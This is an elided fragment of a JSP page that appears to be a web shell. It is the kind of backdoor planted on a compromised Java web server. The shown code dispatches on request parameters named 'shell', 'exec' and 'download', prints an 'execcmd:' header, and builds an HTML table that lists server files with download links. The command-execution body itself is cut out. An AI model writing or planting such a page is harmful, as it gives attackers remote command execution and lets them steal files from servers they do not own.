	...
	try{
		...
		if(isNotEmpty(action) && !"get".equalsIgnoreCase(action)){
			if("shell".equalsIgnoreCase(action)){
				...
				out.println("filedownloadsuccessful.");
			}else if("exec".equalsIgnoreCase(action)){
				out.println("<h1>execcmd:</h1>");
...
<td align="center"><font size="+1"><strong>filesize</strong></font></td>
<td align="center"><font size="+1"><strong>download</strong></font></td>
<td align="right"><font size="+1"><strong>lastmodify</strong></font></td>
</tr>
<%					
				...
				for(int i = 0; i < ls.size(); i++){
					...
					out.println("<tr "+((i%2!=0)?"bgcolor=\"#eeeeee\"":"")+"><td align=\"left\">&nbsp;&nbsp;<a href=\"javascript:get('"+(f.getCanonicalPath().replaceAll("\\\\","/"))+"');\"><tt>"+f.getName()+"</tt></a></td><td align=\"center\"><tt>"+(f.length()/1000)+"KB</tt></td><td align=\"center\"><a href=\""+request.getContextPath()+request.getServletPath()+"?action=download&p="+path+"&fileName="+f.getName()+"\"><tt>download</tt></a></td><td align=\"right\"><tt>"+new SimpleDateFormat("yyyy-MM-dd hh:mm:ss").format(new Date(f.lastModified())) +"</tt></td></tr>");
				}
			}else{
